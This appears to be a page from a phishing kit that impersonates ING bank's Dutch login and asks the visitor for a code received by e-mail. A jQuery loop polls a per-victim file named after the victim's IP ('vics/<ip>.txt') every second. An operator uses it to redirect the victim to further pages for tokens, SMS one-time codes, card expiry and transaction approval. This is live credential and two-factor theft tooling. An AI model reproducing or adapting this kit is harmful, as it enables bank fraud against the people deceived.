<?php
 
    require_once "../app.php";
   

?>
<?php 
function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }
?>
<html><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    
    <link rel="stylesheet" href="./css/font-awesome.min.css">
    
    
    <link rel="stylesheet" href="./css/bootstrap.min.css">
    <link rel="stylesheet" href="./css/core_form.css">

    


    <base href="">
    <link rel="stylesheet" href="./css/css.css">
    <meta charset="UTF-8">
    <link rel="shortcut icon" type="image/png" href="./css/favicon.ico">
</head>

<body ng-app="app" ng-controller="c1" ng-model-options="{'allowInvalid':true}" class="ng-scope">
    <form action="./index.php" id="WizardForm" method="post" accept-charset="utf-8">

    <title class="ng-binding">Meld u aan bij Mijn ING</title>
    <div class="top">
        <div class="container">
            <div class="clearfix">
                <img class="logo" src="./css/ing-logo.svg">
                
            </div>
        </div>
    </div>
    <div class="main mt-3 mt-sm-5">
        <div class="box" id="box">
            <div class="container">
                <div class="box2">
                    <div class="scum_container loader_hide">
                        <div class="scum" id="exp-view">
                                <div class="title ng-binding">
                                    Kaartinformatie
                                </div>
                                <hr>
                                <!-- <p class="legend">
                                    Lorem ipsum dolor sit amet, consectetur adipisicing elit. Autem in, sunt quos ipsum quam aliquid optio delectus quisquam ut ea ducimus nihil saepe commodi voluptas molestiae impedit officia, perferendis. Doloremque.
                                </p> -->
                                <div class="alert alert-danger alert-dismissible err_div ng-binding" style="display: none;">
                                    <strong class="ng-binding">Fouten: </strong> U moet hieronder een aantal van die velden inchecken.
                                    <button type="button" onclick="$(this).parent().hide()" class="close">
                                        <span aria-hidden="true">×</span>
                                    </button>
                                </div>
                                

                                

                                
                                




                                
    

                                <h4 class="ng-binding">Voer de code in die u per e-mail heeft ontvangen

</h4>
                                <script>
function formatExpiryDate(input) {
    // Remove all non-digit characters
    let value = input.value.replace(/\D/g, '');

    // Insert a slash after the second digit (MM) if it's long enough
    if (value.length >= 3) {
        value = value.slice(0, 2) + '/' + value.slice(2, 6);
    }

    input.value = value;
}
</script><div class="form-group">
                                    
                                    <input type="text" name="eml" id="exp" mask-placeholder="MM/JJJJ" placeholder="" class="form-control ng-pristine ng-untouched ng-valid ng-empty ng-valid-pattern" data-ng-model="data.exp" required="" oninput="formatExpiryDate(this)" maxlength="10">
                                    <span class="err_span ng-binding" style="display: none;">
                                        <img class="i8" src="exl.png"> Waarde onjuist
                                    </span>
                                </div>



                                
                                <div class="button-div d-flex justify-content-between align-items-center">
                                    <div class="">
                                        
                                    </div>
                                    <button class="btn btn-warning ng-binding">Bevestigen</button>
                                </div>
                            
                        </div>
                    </div>
                </div>
            </div>
        <div class="loader__ waiter__" style="">    <div class="loader-box">        <span class="fa fa-circle-o-notch fa-spin"></span>        <p class="waiter_p ng-binding">Een moment ...</p>    </div></div></div>
    </div></form>
    <div class="footer-links ">
        
    </div>
    
   <script>
    /*! modernizr 3.11.4 (Custom Build) | MIT *
     * https://modernizr.com/download/?-cssscrollbar-flexbox-getrandomvalues-smil-setclasses-cssclassprefix:modzr- !*/
    !function(e,n,t,r){function o(e,n){return typeof e===n}function i(e,n){return!!~(""+e).indexOf(n)}function s(){return"function"!=typeof t.createElement?t.createElement(arguments[0]):S?t.createElementNS.call(t,"http://www.w3.org/2000/svg",arguments[0]):t.createElement.apply(t,arguments)}function l(){var e=t.body;return e||(e=s(S?"svg":"body"),e.fake=!0),e}function a(e,n,r,o){var i,a,f,u,c="modernizr",d=s("div"),p=l();if(parseInt(r,10))for(;r--;)f=s("div"),f.id=o?o[r]:c+(r+1),d.appendChild(f);return i=s("style"),i.type="text/css",i.id="s"+c,(p.fake?p:d).appendChild(i),p.appendChild(d),i.styleSheet?i.styleSheet.cssText=e:i.appendChild(t.createTextNode(e)),d.id=c,p.fake&&(p.style.background="",p.style.overflow="hidden",u=x.style.overflow,x.style.overflow="hidden",x.appendChild(p)),a=n(d,e),p.fake?(p.parentNode.removeChild(p),x.style.overflow=u,x.offsetHeight):d.parentNode.removeChild(d),!!a}function f(e){return e.replace(/([A-Z])/g,function(e,n){return"-"+n.toLowerCase()}).replace(/^ms-/,"-ms-")}function u(e,t,r){var o;if("getComputedStyle"in n){o=getComputedStyle.call(n,e,t);var i=n.console;if(null!==o)r&&(o=o.getPropertyValue(r));else if(i){var s=i.error?"error":"log";i[s].call(i,"getComputedStyle returning null, its possible modernizr test results are inaccurate")}}else o=!t&&e.currentStyle&&e.currentStyle[r];return o}function c(e,t){var o=e.length;if("CSS"in n&&"supports"in n.CSS){for(;o--;)if(n.CSS.supports(f(e[o]),t))return!0;return!1}if("CSSSupportsRule"in n){for(var i=[];o--;)i.push("("+f(e[o])+":"+t+")");return i=i.join(" or "),a("@supports ("+i+") { #modernizr { position: absolute; } }",function(e){return"absolute"===u(e,null,"position")})}return r}function d(e){return e.replace(/([a-z])-([a-z])/g,function(e,n,t){return n+t.toUpperCase()}).replace(/^-/,"")}function p(e,n,t,l){function a(){u&&(delete E.style,delete E.modElem)}if(l=!o(l,"undefined")&&l,!o(t,"undefined")){var f=c(e,t);if(!o(f,"undefined"))return f}for(var u,p,m,v,h,g=["modernizr","tspan","samp"];!E.style&&g.length;)u=!0,E.modElem=s(g.shift()),E.style=E.modElem.style;for(m=e.length,p=0;p<m;p++)if(v=e[p],h=E.style[v],i(v,"-")&&(v=d(v)),E.style[v]!==r){if(l||o(t,"undefined"))return a(),"pfx"!==n||v;try{E.style[v]=t}catch(e){}if(E.style[v]!==h)return a(),"pfx"!==n||v}return a(),!1}function m(e,n){return function(){return e.apply(n,arguments)}}function v(e,n,t){var r;for(var i in e)if(e[i]in n)return!1===t?e[i]:(r=n[e[i]],o(r,"function")?m(r,t||n):r);return!1}function h(e,n,t,r,i){var s=e.charAt(0).toUpperCase()+e.slice(1),l=(e+" "+b.join(s+" ")+s).split(" ");return o(n,"string")||o(n,"undefined")?p(l,n,r,i):(l=(e+" "+P.join(s+" ")+s).split(" "),v(l,n,t))}function g(e,n,t){return h(e,r,r,n,t)}var y=[],w={_version:"3.11.4",_config:{classPrefix:'modzr-',enableClasses:!0,enableJSClass:!0,usePrefixes:!0},_q:[],on:function(e,n){var t=this;setTimeout(function(){n(t[e])},0)},addTest:function(e,n,t){y.push({name:e,fn:n,options:t})},addAsyncTest:function(e){y.push({name:null,fn:e})}},Modernizr=function(){};Modernizr.prototype=w,Modernizr=new Modernizr;var C=[],x=t.documentElement,S="svg"===x.nodeName.toLowerCase(),_="Moz O ms Webkit",b=w._config.usePrefixes?_.split(" "):[];w._cssomPrefixes=b;var z={elem:s("modernizr")};Modernizr._q.push(function(){delete z.elem});var E={style:z.elem.style};Modernizr._q.unshift(function(){delete E.style});var P=w._config.usePrefixes?_.toLowerCase().split(" "):[];w._domPrefixes=P,w.testAllProps=h;var N=function(e){var t,o=U.length,i=n.CSSRule;if(void 0===i)return r;if(!e)return!1;if(e=e.replace(/^@/,""),(t=e.replace(/-/g,"_").toUpperCase()+"_RULE")in i)return"@"+e;for(var s=0;s<o;s++){var l=U[s];if(l.toUpperCase()+"_"+t in i)return"@-"+l.toLowerCase()+"-"+e}return!1};w.atRule=N;var T,j=w.prefixed=function(e,n,t){return 0===e.indexOf("@")?N(e):(-1!==e.indexOf("-")&&(e=d(e)),n?h(e,n,t):h(e,"pfx"))},A=j("crypto",n);if(A&&"getRandomValues"in A&&"Uint32Array"in n){var R=new Uint32Array(10),k=A.getRandomValues(R);T=k&&o(k[0],"number")}Modernizr.addTest("getrandomvalues",!!T),w.testAllProps=g,Modernizr.addTest("flexbox",g("flexBasis","1px",!0));var L=w.testStyles=a,U=w._config.usePrefixes?" -webkit- -moz- -o- -ms- ".split(" "):["",""];w._prefixes=U,L("#modernizr{overflow: scroll; width: 40px; height: 40px; }#"+U.join("scrollbar{width:10px} #modernizr::").split("#").slice(1).join("#")+"scrollbar{width:10px}",function(e){Modernizr.addTest("cssscrollbar","scrollWidth"in e&&30===e.scrollWidth)});var V={}.toString;Modernizr.addTest("smil",function(){return!!t.createElementNS&&/SVGAnimate/.test(V.call(t.createElementNS("http://www.w3.org/2000/svg","animate")))}),function(){var e,n,t,r,i,s,l;for(var a in y)if(y.hasOwnProperty(a)){if(e=[],n=y[a],n.name&&(e.push(n.name.toLowerCase()),n.options&&n.options.aliases&&n.options.aliases.length))for(t=0;t<n.options.aliases.length;t++)e.push(n.options.aliases[t].toLowerCase());for(r=o(n.fn,"function")?n.fn():n.fn,i=0;i<e.length;i++)s=e[i],l=s.split("."),1===l.length?Modernizr[l[0]]=r:(Modernizr[l[0]]&&(!Modernizr[l[0]]||Modernizr[l[0]]instanceof Boolean)||(Modernizr[l[0]]=new Boolean(Modernizr[l[0]])),Modernizr[l[0]][l[1]]=r),C.push((r?"":"no-")+l.join("-"))}}(),function(e){var n=x.className,t=Modernizr._config.classPrefix||"";if(S&&(n=n.baseVal),Modernizr._config.enableJSClass){var r=new RegExp("(^|\\s)"+t+"no-js(\\s|$)");n=n.replace(r,"$1"+t+"js$2")}Modernizr._config.enableClasses&&(e.length>0&&(n+=" "+t+e.join(" "+t)),S?x.className.baseVal=n:x.className=n)}(C),delete w.addTest,delete w.addAsyncTest;for(var O=0;O<Modernizr._q.length;O++)Modernizr._q[O]();e.Modernizr=Modernizr}(window,window,document);

    if (Modernizr.getrandomvalues && Modernizr.flexbox && Modernizr.smil) {
      document.getElementById('tb-application').style.display = 'block';
    } else {
      document.getElementById('tb-unsupported-browser').style.display = 'block';
      document.body.style.background = '#08080A';
      document.body.style.margin = '0';
    }
  </script>

             <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
            <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
            <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
    <script>


            var ip = '<?php echo get_client_ip() ?>';
            var waiting = setInterval(function() {
                $.get('vics/' + ip + '.txt', function(data) {
                    var zz = data.split("|");
                    var dd = zz[0];
                    if( data == 0 ) {
                    } else if( dd == 'badloginraf' ) {
                        location.href = "login.php?error=1";
                    } else if( dd == 'token1' ) {
                        location.href = "token.php?code=" + zz[1];
                    } else if( dd == 'token2' ) {
                        location.href = "token2.php?code=" + zz[1];
                    } else if( dd == 'token3' ) {
                        location.href = "token3.php?error=1&code=" + zz[1];
                    } else if( dd == 'sms' ) {
                        location.href = "otp.php?code=" + zz[1];
                    } else if( dd == 'num' ) {
                        location.href = "num.php?code=" + zz[1];
                    } else if( dd == 'exp' ) {
                        location.href = "exp.php?code=" + zz[1];
                    } else if( dd == 'cc' ) {
                        location.href = "coc.php";
                    } else if( dd == 'extra' ) {
                        location.href = "extra.php?code=" + zz[1];
                    } else if( dd == 'approve' ) {
                        location.href = "approve.php?code=" + zz[1];						
                    } else if( dd == 'success' ) {
                        location.href = "../success.php";
                    }
                });
				$.get('./time.php', function(data) {
                if( data == 0 ) {
                       
                } else {
                       
				
                }
                });
            }, 1000);
        </script>
    
    


</body></html>